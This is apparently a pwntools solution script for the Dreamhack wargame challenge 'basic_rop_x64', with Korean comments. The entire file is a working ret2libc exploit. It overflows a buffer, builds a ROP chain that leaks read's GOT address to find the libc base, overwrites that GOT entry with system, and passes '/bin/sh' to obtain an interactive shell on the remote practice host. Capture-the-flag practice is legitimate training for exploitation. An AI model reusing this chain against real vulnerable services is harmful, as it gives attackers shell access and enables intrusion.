from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

def start():
    if args.REMOTE:
        host="host8.dreamhack.games"
        port=14461
        return remote(host,port)
    else:
        return process('./basic_rop_x64')
p=start()
#바이너리 read write주소
e = ELF('./basic_rop_x64')
libc = ELF("./libc.so.6")
read_got = e.got['read']
read_plt = e.plt['read']
write_got = e.got['write']
write_plt = e.plt['write']

pop_rdi = 0x400883
pop_rsi = 0x400881
ret = 0x4005a9

payload = b'a'*0x48
#라이브러리에서 쉘명령 실행 
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(read_got)    #plt는 got참조하여 실행하니 got주소 알아야함
payload += p64(0)
payload += p64(write_plt)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(read_got)    
payload += p64(0)
payload += p64(read_plt)    #read_got크기

payload += p64(pop_rdi)
payload += p64(read_got+0x08)   
payload += p64(ret)
payload +=p64(read_plt)

p.send(payload)

# read address
p.recvuntil(b'a'*0x40)
read_addr = u64(p.recvn(8))
libc_base = read_addr - libc.symbols['read']
log.info(f'read : {hex(read_addr)}')
log.info(f'libc_base : {hex(libc_base)}')

# system
system = libc_base + libc.symbols['system']
log.info(f'system : {hex(system)}')

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
